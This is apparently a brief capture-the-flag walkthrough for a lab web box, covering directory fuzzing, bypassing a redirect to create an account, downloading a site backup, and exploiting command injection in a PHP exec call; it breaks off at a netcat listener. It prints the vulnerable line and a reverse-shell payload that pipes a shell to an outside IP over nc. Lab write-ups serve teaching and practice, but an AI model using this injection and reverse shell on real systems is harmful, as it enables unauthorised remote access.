Doing a directory fuzz reveals the page 'accounts.php' exists, but it redirects to 'login.php'
Capture the request in burpsuite and see that accounts.php is a page that is viewable before the redirect

Post to this page with paramaters 'username=&passoword=&confirm=' to create an account, then login with account

Go to files.php and download the only file, which is a site backup
Looking at 'logs.php' find a vulnerable python exec
```php
$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
```
This can be exploited by posting the delim paramter with a payload that looks something like
```bash
delim=;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.102 9001 >/tmp/f
```
```bash
-> % nc -lvnp 9001
listening on [any] 9001 ...
